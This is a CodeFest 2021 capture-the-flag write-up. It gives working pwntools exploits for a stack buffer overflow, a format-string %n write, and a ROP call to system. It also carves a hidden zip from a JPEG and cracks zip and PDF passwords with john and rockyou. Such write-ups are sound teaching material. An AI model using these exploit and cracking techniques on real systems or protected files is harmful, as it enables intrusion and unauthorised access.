# WriteUp for CodeFest

These will include the challenges I was able to do in the last 2 hours of the 24 hour ctf @ CodeFest 2021. I was able to solve the entire pwn category which was easy and beginner friendly and one forensics challenge which was very practical and straight-forward.

# Pwn Category

## C is Hard

#### [Download files from here](https://github.com/not-duckie/RandomPwn/tree/master/ctf21/C_is_hard)

This was the first challenge which has stack overflow vulnerability and the goal was to overflow the buf and call a hidden function called print_flag.

Let's start by analyzing the function in radare2.

```
r2 -R'stdin=input.txt' ./source_fixed.
```

![](https://i.imgur.com/4FEEWxS.png)

So our target is to go to the `sym.print_flag` as it will get us the flag. So how we can jump to the function. Lets start by analyzing the `sym.vuln` function.

![](https://i.imgur.com/VcWQQvr.png)

The function seems simple: we overflow the buffer s (i.e rbp-0x20 \[check top of the function\]). So after we give 0x20 bytes we will get to rbp and then rip. Thus our exploit will look like this:-

```
from pwn import *

padding = b'i'*0x20
flag = p64(0x4011b6)

payload = padding
payload += b'A'*0x8
payload += flag

#p = process('./source_fixed')
p = remote('chall.codefest.tech',8780)
p.recvline()
p.sendline(payload)
p.interactive()
```

and we get our first flag as:-
codefest{overflowing_stacks_for_flags_and_fun_768999766}

## Take Me to Cafe
#### [Download files from here](https://github.com/not-duckie/RandomPwn/tree/master/ctf21/take_me_to_cafe)


This challenge is format string vulnerability in which we will have to overwrite a variable to value 0xcafe in order to get the flag and then finally go to the pawry(hidden joke in challenge :P).

start by analyzing the function:-

```bash
r2 -R'stdin=input.txt' ./format
```

![](https://i.imgur.com/hO4whEy.png)

![](https://i.imgur.com/nmmVc7b.png)

We see that the function sym.print_flag is called if the `cmp eax, 0xcafe` is passed. So all we need to do is move the value 0xcafe to ebx+0x44 so it is moved to eax and then we pass the cmp and get the flag.

The vulnerability as hinted by the binary name and the confirmed from the source code is format string. With this we can write any value to any address with the help of %n parameter.

%n basically write the number of bytes printed to screen so far to a given address.

Let's start by determining where our first argument lands on the stack. Send the input

```bash
aaaabbbbcccc%lx %lx...
```
repeat the %lx until you see the aaaa in hex.

![](https://i.imgur.com/wj92pSQ.png)

we see that our aaaa lands as the 4th argument on the stack. Confirm it by testing it again.

![](https://i.imgur.com/M36tQuF.png)

Now all we need to overwrite the cmp to pass it and get the flag shown we found earlier. Thus the exploit will look like this.

The exploit basically writes a number to a given address that is 0x804c044. It takes some hit and trial to find the correct value to write but start with int(0xcafe) and adjust accordingly.

```python
from pwn import *

padding = b'i'*88

addr = p32(0x804c044)

payload = addr + b"%51962d%4$hn"

#p = process('./format')
p = remote('chall.codefest.tech',8744)
print(p.recvuntil('will go\n'))
p.sendline(payload)
p.interactive()
```
And we get the flag along with the meme reference.
![](https://i.imgur.com/DHieiRo.png)


## Welcome to the Pawry

Welcome the pawry is a simple rop challenge. We get a buffer overflow, string in binary "/bin/cat flag.txt" and system call and we need to create a rop chain to get the flag.

The challenge is straightforward so the exploit should be self explanatory.

```python
from pwn import *


# 24 + ebp + eip

padding = b'i'*28

binCat = p32(0x804c028)
system_call = p32(0x8049214)


payload = padding + system_call + binCat

p = process('./pawry')
#p = remote('chall.codefest.tech',8686)
p.recvuntil('.')
p.sendline(payload)
p.interactive()
```

# Forensics

## Anime is Love <3
#### [Download files from here](https://github.com/not-duckie/RandomPwn/tree/master/ctf21/animeIsLove)

This was a good forensics challenge that required a little bit of manual work. I liked it alot. The challenge starts with the given prompt.

![](https://i.imgur.com/GjtltNN.png)

So start by analyzing the hexdump of the image and find that there is flag.txt at the end of the image.

![](https://i.imgur.com/nFL08k5.png)

So let's extract it. The jpg files usually end with FFD9 byte. We extract everything after that in file called foo.

```
dd if=anime.jpg of=tmp bs=1 skip=362196
```

Here skip the address of the line where we found the ending byte in int (0x586D4).

### Note

```bash
i am using ghex and my hex editor.
```

![](https://i.imgur.com/TATw0ud.png)

After cleaning up the file by removing extra bytes that may have been copied and fixing the magic byte of the zip file (i.e 50 4B). And we have a clean zip file.

When we try to open it we find it has a password protection. So convert it to hash and brute force it with john.

```bash
zip2john tmp.zip > hash
john --wordlist=~/rockyou.txt hash
```

We find the password as dragonballz. But the picture was of naruto ? wtf.

The flag.txt is a pdf file which when opened with the viewer opens weird. So lets repair it with foremost and try it again.

```bash
foremost flag.txt
```
Now when it opens it, it asks for a password.

```bash
pdf2john 00000.pdf > hash
john --wordlist=~/rockyou.txt hash
```

The password is naruto and we get the flag.

codefest{y0u_4r3_g00d_4t_m4g1c_byt35}
